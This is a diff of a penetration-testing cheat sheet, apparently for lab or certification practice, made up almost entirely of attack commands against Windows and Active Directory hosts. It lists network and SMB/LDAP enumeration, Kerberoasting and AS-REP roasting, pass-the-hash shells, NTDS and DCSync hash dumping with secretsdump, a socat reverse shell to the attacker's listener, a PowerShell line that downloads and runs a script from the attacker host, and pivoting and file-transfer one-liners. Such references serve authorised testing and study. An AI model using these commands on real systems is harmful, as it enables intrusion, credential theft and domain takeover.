@@ -5,13 +5,14 @@
 # Quick top 1000 TCP scan - basic enumeration
 nmap -sC -sV -oN nmap_quick_$targetip.txt $targetip
 
-# Full TCP port scan - find all open ports
+# Full TCP port scan - find all open TCP ports
 nmap -p- --min-rate 1500 -oN nmap_allports_$targetip.txt $targetip
 
 # Aggressive full TCP scan with tuning - deeper enumeration
 nmap -p- -Pn $targetip -v -T4 --min-rate 1500 --max-rtt-timeout 500ms --max-retries 3 --open -oN nmap_aggr_$targetip.txt
 
 # Service/version & default scripts on specific ports
+# Example: -p 80,135,139,445,3389
 nmap -sC -sV -p <ports> -oN nmap_detail_$targetip.txt $targetip
 
 # UDP top ports scan - find important UDP services
@@ -43,7 +44,6 @@ whatweb $targetip
 # Basic web vuln scanning - Nikto
 nikto -h $targetip -output nikto_$targetip.txt
 
-
 ######################################################################
 # SMB ENUMERATION
 ######################################################################
@@ -52,13 +52,19 @@ nikto -h $targetip -output nikto_$targetip.txt
 smbclient -L //$targetip/ -N
 
 # Connect to specific SMB share with anonymous auth
-smbclient -U "" //$targetip/$target
+smbclient //$targetip/$target -U ""
 
 # Connect to specific SMB share with empty password
-smbclient -N //$targetip/$target
+smbclient //$targetip/$target -N
 
-# List SMB shares and perform full enumeration - enum4linux
+# SMB enumeration via enum4linux-ng
 enum4linux-ng -A $targetip | tee enum4linux_$targetip.txt
+
+# smbmap - anonymous
+smbmap -H $targetip
+
+# smbmap - with credentials
+smbmap -H $targetip -u $user -p "$password"
 
 # CrackMapExec SMB basic enumeration - check SMB info
 crackmapexec smb $targetip
@@ -98,9 +104,11 @@ rpcclient -N $targetip
 # RPCClient null session with explicit syntax
 rpcclient -U "" -N $targetip
 
-# Enumerate domain users via RPCClient after login
-# (inside rpcclient prompt)
+# After login inside rpcclient:
 # enumdomusers
+# enumdomgroups
+# querydominfo
+
 
 ######################################################################
 # LDAP ENUMERATION
@@ -109,8 +117,9 @@ rpcclient -U "" -N $targetip
 # Anonymous LDAP search - base DSE
 ldapsearch -x -H ldap://$targetip -s base
 
-# LDAP domain enumeration with base DN - AD users/groups
-ldapsearch -x -H ldap://$targetip -b "dc=$domain,dc=local"
+# LDAP domain enumeration with base DN - set $basedn manually
+# Example: basedn='dc=hq,dc=vanguard,dc=bank'
+ldapsearch -x -H ldap://$targetip -b "$basedn"
 
 # NetExec LDAP users enumeration with anonymous or known creds
 netexec ldap $targetip -u "" -p "" --users
@@ -123,6 +132,9 @@ netexec ldap $targetip -u $user -p "$password" --users
 
 # NetExec WINRM auth check - verify WinRM access
 netexec winrm $targetip -u $user -p "$password"
+
+# CrackMapExec WINRM check
+crackmapexec winrm $targetip -u $user -p "$password"
 
 # Evil-WinRM interactive PowerShell session
 evil-winrm -i $targetip -u $user -p "$password"
@@ -159,14 +171,17 @@ mssqlclient.py $domain/$user:"$password"@$targetip -windows-auth
 # IMPACKET - AUTH, KERBEROASTING, DUMPS, SHELLS
 ######################################################################
 
-# Request service tickets for all SPNs - Kerberoasting
+# Request service tickets for all SPNs - Kerberoasting (screen only)
 impacket-GetUserSPNs $domain/$user:"$password" -dc-ip $targetip -request
 
 # Kerberoasting with user list - output JtR-format hashes
 impacket-GetUserSPNs $domain/ -dc-ip $targetip -userfile users.txt -outputfile hashes_spn_john.txt -format john
 
-# AS-REP Roasting - find users without pre-auth
+# AS-REP Roasting - find users without pre-auth (output for cracking)
 impacket-GetNPUsers $domain/ -dc-ip $targetip -usersfile users.txt -format john -outputfile asrep_hashes.txt
+
+# Quick AS-REP roast (screen only, no file)
+impacket-GetNPUsers $domain/ -dc-ip $targetip -no-pass
 
 # Impacket WMIExec with cleartext password - remote semi-interactive shell
 impacket-wmiexec $domain/$user:"$password"@$targetip
@@ -180,17 +195,19 @@ impacket-psexec $domain/$user:"$password"@$targetip
 # Impacket PSExec with hash - pass-the-hash over SMB
 impacket-psexec $domain/$user@$targetip -hashes <LMHASH:NTLMHASH>
 
-# Dump domain hashes from DC - NTDS.dit extraction (DC/DC-like)
+# Dump domain hashes from DC - NTDS.dit extraction (requires DA)
 impacket-secretsdump $domain/$user:"$password"@$targetip
 
 # Dump only NTLM from DC - NTDS.dit quick dump
 impacket-secretsdump -just-dc-ntlm $domain/$user:"$password"@$targetip
 
-# Dump local SAM hashes remotely from a host
-impacket-secretsdump -sam SAM -system SYSTEM local
+# DCSync attack - dump domain hashes via replication
+impacket-secretsdump -just-dc $domain/$user:"$password"@$targetip
 
-# DCSync attack - dump domain hashes without touching ntds.dit directly
-impacket-secretsdump $domain/$user:"$password"@$targetip -just-dc
+# Dump local SAM hashes remotely from a host (local hive example)
+# (Use from mounted hives or live system with proper paths)
+impacket-secretsdump -sam SAM -system SYSTEM LOCAL
+
 
 ######################################################################
 # NETEXEC / CRACKMAPEXEC - HASH DUMPING WORKFLOW
@@ -251,12 +268,12 @@ evil-winrm -i $targetip -u $user -H <NTLMHASH>
 # User enumeration against DC - Kerbrute userenum
 kerbrute userenum users.txt --dc $targetip -d $domain
 
-# Search Group Policy Preferences XML files in SMB/FS - gpp cpassword hunting
-# (use this idea: search for group.xml and cpassword)
-# Google Dork: "group.xml" "cpassword"
+# Search Group Policy Preferences XML files in SMB/FS - gpp cpassword hunting (Windows)
+# findstr /S /I cpassword *.xml
 
 # Decrypt GPP cpassword value - gpp-decrypt
 gpp-decrypt <cpassword_value>
+
 
 ######################################################################
 # PASSWORD / HASH CRACKING
@@ -293,7 +310,8 @@ socat tcp:$localip:4444 exec:/bin/bash,pty,stderr,setsid,sigint,sane
 
 # Upgrade simple shell to TTY (Linux) - Python pty
 python3 -c 'import pty; pty.spawn("/bin/bash")'
-# Then in Kali: Ctrl+Z, stty raw -echo; fg; reset
+# Then on Kali: Ctrl+Z, then:
+# stty raw -echo; fg; reset
 
 
 ######################################################################
@@ -313,6 +331,9 @@ sudo -l
 
 # Find SUID binaries - SUID privesc
 find / -perm -4000 -type f 2>/dev/null
+
+# Find SGID binaries
+find / -perm -2000 -type f 2>/dev/null
 
 # Find writable directories - world-writable paths
 find / -writable -type d 2>/dev/null
@@ -345,6 +366,9 @@ whoami /all
 # OS & patch info
 systeminfo
 
+# Installed hotfixes (missing patches)
+wmic qfe
+
 # List users and groups
 net user
 net localgroup
@@ -362,21 +386,20 @@ schtasks /query /fo LIST /v
 sc query state= all
 
 # Download and run winPEAS (example PowerShell)
-# (From WinRM or CMD/PS)
 powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://$localip/winPEAS.ps1')"
+
 
 ######################################################################
 # ACTIVE DIRECTORY ENUMERATION - BLOODHOUND
 ######################################################################
 
 # Collect AD data with SharpHound on Windows target
-# Run from compromised Windows host
 Sharphound.exe -c All -d $domain -zipfilename loot_bloodhound.zip
 
-# Bloodhound tips:
-# - Upload loot_bloodhound.zip to your Kali
-# - Import into BloodHound GUI and analyze paths
-# (No direct command here; just workflow reminder)
+# Then:
+# - Download loot_bloodhound.zip to Kali
+# - Import into BloodHound GUI
+# - Analyze attack paths (Shortest Path to DA, etc.)
 
 
 ######################################################################
@@ -397,6 +420,7 @@ chisel client $localip:9001 R:socks
 # Example proxied Nmap scan:
 # proxychains nmap -sT -Pn -n 10.10.20.10 -p 80,445
 
+
 ########################
 # SSH PORT FORWARDING
 ########################
@@ -410,18 +434,17 @@ ssh -R 0.0.0.0:8080:127.0.0.1:80 $user@$targetip
 # Dynamic SOCKS proxy via SSH - full pivot of traffic
 ssh -D 9050 $user@$targetip
 
+
 ########################
 # SOCAT PORT FORWARDING
 ########################
 
-# Socat port forward on Linux pivot host - forward local 0.0.0.0:8080 to 10.10.20.10:80
+# Socat port forward on Linux pivot host - forward local :8080 to 10.10.20.10:80
 socat TCP-LISTEN:8080,fork TCP:10.10.20.10:80
 
-# Socat reverse tunnel equivalent (if needed):
-# Run listener on Kali and connect from target appropriately
 
 ######################################################################
-# ACTIVE DIRECTORY ATTACK CHEATSHEET
+# ACTIVE DIRECTORY ATTACK CHEATSHEET (IMPACKET / CERTIPY / KERBRUTE)
 ######################################################################
 
 ###############################
@@ -431,16 +454,18 @@ socat TCP-LISTEN:8080,fork TCP:10.10.20.10:80
 # Enumerate AS-REP roastable users (-no-pass required)
 impacket-GetNPUsers $domain/ -dc-ip $targetip -no-pass -usersfile users.txt
 
+
 ###############################
 # KERBEROASTING
 ###############################
+
 # Request TGS tickets for all SPNs
 impacket-GetUserSPNs $domain/$user:$password -dc-ip $targetip -request
 
-# Request TGS tickets for all SPNs
+# Request TGS tickets and write JtR-format hashes
 impacket-GetUserSPNs $domain/$user:$password -dc-ip $targetip -request -outputfile kerberoast_hashes.txt -format john
 
-# Export in offline audit format
+# Export in offline audit format (alt filename)
 impacket-GetUserSPNs $domain/$user:$password -dc-ip $targetip -request -outputfile kerb_hashes.txt -format john
 
 
@@ -450,6 +475,7 @@ impacket-GetUserSPNs $domain/$user:$password -dc-ip $targetip -request -outputfi
 
 # Probe Kerberos for valid usernames
 kerbrute userenum -d $domain --dc $targetip users.txt
+
 
 ###############################
 # CERTIFICATE SERVICES (AD CS) ENUM 
@@ -472,9 +498,6 @@ certipy cert -pfx cert.pfx -key key.pem -cert cert.pem
 
 
 ######################################################################
-
-
-######################################################################
 # MISC / GENERAL
 ######################################################################
 
@@ -494,6 +517,6 @@ curl http://$localip/filename -o filename
 certutil -urlcache -split -f http://$localip/file.exe file.exe
 
 ######################################################################
-# END OF CHEATSHEET
+
 ######################################################################
 
